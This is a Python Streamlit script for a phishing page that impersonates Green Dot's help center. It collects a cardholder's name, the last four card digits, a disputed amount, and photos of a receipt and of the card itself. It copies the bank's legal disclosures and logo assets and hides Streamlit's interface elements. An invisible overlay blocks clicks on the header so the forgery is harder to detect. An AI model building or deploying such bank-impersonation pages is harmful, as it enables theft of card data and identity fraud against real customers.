
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS DE BLOQUEO ABSOLUTO ---
st.markdown("""<style>
/* 1. Crear una capa invisible que cubra el logo y el título para bloquear clics */
.stApp::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 180px; /* Cubre toda la zona de cabecera */
    z-index: 999999;
    pointer-events: all; /* Captura los clics y no hace nada */
    background: transparent;
}

/* 2. Ocultar elementos nativos de Streamlit */
header, footer, .stDeployButton, [data-testid='stHeader'], .section-anchor, a.section-anchor {
    display: none !important;
    visibility: hidden !important;
}

/* 3. Estética General */
.stApp {
    background-color: #000000 !important;
    color: #FFFFFF !important;
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border: none !important;
    width: 100%;
    padding: 15px !important;
    font-weight: bold !important;
    text-transform: uppercase;
}

input {
    background-color: #111 !important;
    color: white !important;
    border: 1px solid #333 !important;
}

.app-promo-container {
    background-color: #111111;
    padding: 40px 20px;
    text-align: center;
    border-radius: 12px;
    margin: 30px 0;
    border: 1px solid #222;
}

.legal-footer {
    font-size: 11px;
    color: #666;
    text-align: justify;
    margin-top: 60px;
    border-top: 1px solid #222;
    padding-top: 20px;
    line-height: 1.5;
}
</style>""", unsafe_allow_html=True)

if os.path.exists('logo.svg'):
    st.image('logo.svg', width=160)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Card")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Upload Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        st.success("✅ Claim received.")

st.markdown("""<div class='app-promo-container'>
    <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
    </div>
    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
    The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions for the service and Ingo Money, Inc., which are third parties that operate independently from GO2bank.com. Ingo Money will provide customer service for all mobile check cashing. Subject to the Terms and Conditions and Privacy Policy. Approval usually takes 3-5 minutes but may take up to one hour. All checks are subject to approval for funding in Ingo Money’s sole discretion. Fees apply for approved ‘Money in Minutes’ transactions funding to your card or account. Unapproved checks will not be loaded to your card or account. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use of the Ingo Money Service. Your wireless carrier may charge a fee for data usage. Additional transaction fees, costs, terms and conditions may be associated with the funding use of your card or account. See your Cardholder Account Agreement for details. Note: Ingo Money check cashing services is not available for use within the state of New York.<br><br>
    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
    GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
    All third-party names and logos are trademarks of their respective owners. These owners are not affiliated with Green Dot Corporation and have not sponsored or endorsed Green Dot Bank products or services. Neither Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo® Money and Plaid, Inc. Partner terms and conditions apply.<br><br>
    Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc. Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries. Samsung is a registered trademark of Samsung Electronics Co., Ltd.<br><br>
    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
</div>""", unsafe_allow_html=True)
